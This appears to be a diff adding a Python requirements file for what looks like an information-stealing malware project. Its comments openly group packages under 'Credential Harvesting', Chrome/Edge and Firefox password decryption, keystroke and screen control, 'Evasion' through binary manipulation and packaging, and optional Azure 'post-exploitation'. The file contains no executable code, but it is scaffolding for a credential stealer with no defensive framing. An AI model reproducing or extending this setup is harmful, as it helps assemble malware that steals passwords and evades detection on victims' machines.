@@ -1,0 +1,25 @@
+# Core
+requests==2.31.0
+pycryptodome==3.18.0
+cryptography==41.0.3
+
+# System Interaction
+pywin32==306; sys_platform == 'win32'
+psutil==5.9.5
+pynput==1.7.6
+pyautogui==0.9.54
+
+# Credential Harvesting
+keyring==24.2.0; sys_platform == 'win32'
+beautifulsoup4==4.12.2  # For Firefox credential parsing
+
+# Browser Specific
+pywin32-ctypes==0.2.0; sys_platform == 'win32'  # Chrome/Edge decryption
+
+# Evasion
+lief==0.13.2  # Binary manipulation
+pyinstaller==5.13.0  # For packaging
+
+# Optional (Uncomment if needed)
+# azure-identity==1.13.0  # For Azure post-exploitation
+# pyOpenSSL==23.2.0  # For secure comms
